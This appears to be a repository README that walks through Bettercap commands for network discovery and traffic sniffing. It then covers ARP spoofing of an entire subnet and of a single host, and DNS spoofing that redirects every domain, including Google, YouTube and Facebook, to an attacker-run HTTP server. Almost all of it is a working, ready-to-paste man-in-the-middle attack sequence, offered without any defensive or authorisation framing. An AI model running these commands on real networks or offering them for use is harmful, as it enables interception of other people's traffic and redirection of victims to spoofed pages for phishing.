# Bettercap MITM & Spoofing Guide

This repository contains a structured walkthrough for performing network discovery, Man-in-the-Middle (MITM) attacks, ARP spoofing, and DNS spoofing using Bettercap.

---

### Module 1: Network Discovery & Basics

# 1. Network discovery:
> net.probe on
> net.recon on

# 2. View active hosts:
> net.show

# 3. Set up ARP spoofing:
> set arp.spoof.targets 130.12.180.0/24
> set arp.spoof.fullduplex false
> arp.spoof on

# 4. Start the packet sniffer:
> net.sniff on

---

### Module 2: Advanced DNS Spoofing & Local HTTP Server

# 1. Turn off all modules first to prevent conflicts
>> arp.spoof off
>> dns.spoof off
>> http.proxy off
>> net.sniff off

# 2. Reconfigure ARP spoofing for a specific target
>> set arp.spoof.targets 192.168.1.152
>> set arp.spoof.fullduplex false  # Disable fullduplex
>> set arp.spoof.internal true      # Enable internal network targeting

# 3. Configure and strengthen DNS spoofing
>> set dns.spoof.domains .*
>> set dns.spoof.address 130.12.180.92
>> set dns.spoof.all true
>> set dns.spoof.hosts google.com=130.12.180.92, www.google.com=130.12.180.92, youtube.com=130.12.180.92, facebook.com=130.12.180.92

# 4. Set up a local HTTP server (at 130.12.180.92:80) to serve a landing page
>> set http.server.address 130.12.180.92
>> set http.server.port 80
>> set http.server.page "<h1>DNS Spoofing successfully!!!</h1><p></p>"
>> http.server on

# 5. Launch the spoofing modules
>> arp.spoof on
>> dns.spoof on

# 6. Capture and filter DNS traffic
>> net.sniff on
>> set net.sniff.filter port 53
